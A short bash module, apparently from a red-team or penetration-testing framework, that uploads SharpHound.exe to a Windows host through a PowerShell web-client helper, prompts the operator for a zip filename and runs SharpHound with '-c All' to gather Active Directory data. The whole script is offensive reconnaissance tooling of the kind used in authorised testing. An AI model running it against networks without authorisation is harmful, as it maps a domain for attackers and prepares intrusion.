#!/bin/bash

: '
ps: Upload sharphound and execute
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/windows/bloodhound/.files"
FILE="SharpHound.exe"

ps_webclient_upload_file "${LOCATION}" "${FILE}"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
ZIP_FILENAME_FIELD=$(form_item  "zip filename" "zip_filename")

# Generate GUI form
generate_form "${ZIP_FILENAME_FIELD}"

ZIP_FILENAME=${form_data["zip_filename"]}

execute_command "${FILE_LOCATION} -c All --zipfilename ${ZIP_FILENAME}"
create_new_line

kill $HTTP_PID
